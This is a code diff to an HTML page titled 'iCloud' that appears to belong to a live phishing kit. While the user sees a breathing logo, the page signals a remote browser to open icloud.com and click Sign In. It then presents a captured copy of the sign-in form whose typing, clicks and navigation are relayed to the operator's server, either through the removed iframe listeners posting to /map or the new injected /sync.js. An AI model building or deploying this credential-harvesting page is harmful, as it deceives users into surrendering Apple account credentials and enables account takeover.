@@ -7,29 +7,20 @@
 <title>iCloud</title>
 <style>
   html, body { height:100%; margin:0; background:#000; }
-  body { overflow:hidden; }
 
-  /* The wait: a black screen and the mark, breathing. No text, no buttons, no
-   * "opening this / doing that". */
+  body { display:flex; align-items:center; justify-content:center; }
+
+  /* Nothing else: a black screen and the mark, breathing, until the capture
+   * is ready to take over. No text, no buttons, no links. */
   .mark {
-    position:fixed; top:50%; left:50%;
-    width:64px; height:64px; margin:-32px 0 0 -32px;
+    width:64px; height:64px;
     opacity:0;
     animation:
       fade .45s ease-out both,
       breathe 2.8s ease-in-out .45s infinite;
   }
-  .mark svg { display:block; width:100%; height:100%; fill:#fff; }
 
-  /* The capture, in a frame of its own: its stylesheets, images and fonts are
-   * the capture's, and nothing of this page reaches them. */
-  #capture {
-    position:fixed; inset:0; width:100%; height:100%;
-    border:0; background:#fff;
-    opacity:0; transition:opacity .22s ease-out;
-  }
-  body.show #capture { opacity:1; }
-  body.done .mark { display:none; }
+  .mark svg { display:block; width:100%; height:100%; fill:#fff; }
 
   @keyframes fade { from { opacity:0; } to { opacity:1; } }
   @keyframes breathe {
@@ -39,7 +30,6 @@
 
   @media (prefers-reduced-motion: reduce) {
     .mark { animation:none; opacity:1; }
-    #capture { transition:none; }
   }
 </style>
 </head>
@@ -50,120 +40,46 @@
     </svg>
   </div>
 
-  <iframe id="capture" title="iCloud sign in" hidden></iframe>
-
-<script src="/map.js"></script>
 <script>
-  /* The app is the capture in a frame, and the browser window behind it.
-   *
-   *   /start   opens the browser, goes to icloud.com and presses Sign In
-   *   /status   says when the sign-in form is actually there
-   *   /map     takes what was typed or clicked in the frame
-   *
-   * Nothing is shown until /status says the form is up: the capture is the
-   * answer to the real page, so it appears when the real page is ready for it.
-   */
-  (function () {
-    "use strict";
+  // Where the app goes when the wait is over. The server knows which page
+  // everyone is on, which is not always 1.html.
+  let target = "/src/1.html";
+  let gone = false;
 
-    var frame = document.getElementById("capture");
-    var opened = false;
-    var shown = false;
-    var current = "";
-    var entered = Date.now();
+  /* The capture replaces this document entirely - no frame, no chrome, no
+   * intermediate screen. Its /sync.js, injected by the server, runs at the
+   * top level, so typing, clicks and navigation still reach the server. */
+  function go() {
+    if (gone) return;
+    gone = true;
+    location.replace(target);
+  }
 
-    // The mark is the first thing anyone sees, every time - a reload in the
-    // middle of a sign-in included. It is a pause, not a page.
-    var MARK_MS = 900;
+  // Visiting the page opens the browser and presses Sign In. This screen is
+  // only the wait for that.
+  fetch("/start").catch(() => {});
 
-    function post(message) {
-      try {
-        fetch("/map", {
-          method: "POST",
-          headers: { "content-type": "application/json" },
-          body: JSON.stringify(message),
-          keepalive: true
-        }).catch(function () {});
-      } catch (e) {
-        /* the page is closing, or the server is not there: nothing to do */
-      }
-    }
+  function poll() {
+    fetch("/status")
+      .then((r) => r.json())
+      .then((state) => {
+        if (state.page) target = state.page;
+        // Done is Sign In clicked. An error means the browser will not open;
+        // the capture is still the page the user came for, so show it.
+        if (state.status === "done" || state.status === "error") {
+          go();
+          return;
+        }
+        setTimeout(poll, 250);
+      })
+      .catch(() => setTimeout(poll, 800));
+  }
 
-    // The capture is ours as well as the browser's: same origin, so the fields
-    // inside it can be watched from here. Attaching twice to the same document
-    // does nothing.
-    function cover() {
-      try {
-        window.attachMapping(frame.contentDocument, post);
-      } catch (e) {
-        /* a frame that is not readable yet is bound on its next load */
-      }
-    }
+  poll();
 
-    function show() {
-      if (shown) return;
-      shown = true;
-      frame.hidden = false;
-      document.body.classList.add("show");
-      setTimeout(function () { document.body.classList.add("done"); }, 240);
-    }
-
-    // Every load is a document to bind - the first one, and every step after.
-    frame.addEventListener("load", function () {
-      cover();
-      show();
-    });
-
-    // The frame follows the step the real page is on, so a change of page is
-    // a change of frame and nothing else.
-    function present(page) {
-      if (!page || page === current) return;
-
-      // Nothing is shown before the mark has had its moment.
-      var waited = Date.now() - entered;
-      if (waited < MARK_MS) {
-        setTimeout(function () { present(page); }, MARK_MS - waited);
-        return;
-      }
-
-      current = page;
-      frame.hidden = false;
-      frame.src = page;
-      if (!opened) {
-        opened = true;
-        // A frame that never reports back still gets shown: a black screen
-        // that never ends is worse than a capture a moment late.
-        setTimeout(show, 1200);
-      }
-    }
-
-    // Visiting the page opens the browser and presses Sign In.
-    fetch("/start").catch(function () {});
-
-    function poll() {
-      fetch("/status")
-        .then(function (r) { return r.json(); })
-        .then(function (state) {
-          if (!state) { setTimeout(poll, 800); return; }
-
-          // Done is the sign-in form being up in the browser. An error means
-          // the browser will not open; the capture is still the page the user
-          // came for, so show it.
-          if (state.status === "done" || state.status === "error") {
-            present(state.page || "/src/1.html");
-            // Keep watching, slowly: the sign-in moves on to another step,
-            // and the frame is supposed to move with it.
-            setTimeout(poll, 1000);
-            return;
-          }
-
-          setTimeout(poll, 250);
-        })
-        .catch(function () { setTimeout(poll, 800); });
-    }
-
-    poll();
-  })();
+  // No screen should be permanent. If the browser is still not up after half
+  // a minute, open the capture anyway.
+  setTimeout(go, 30000);
 </script>
 </body>
 </html>
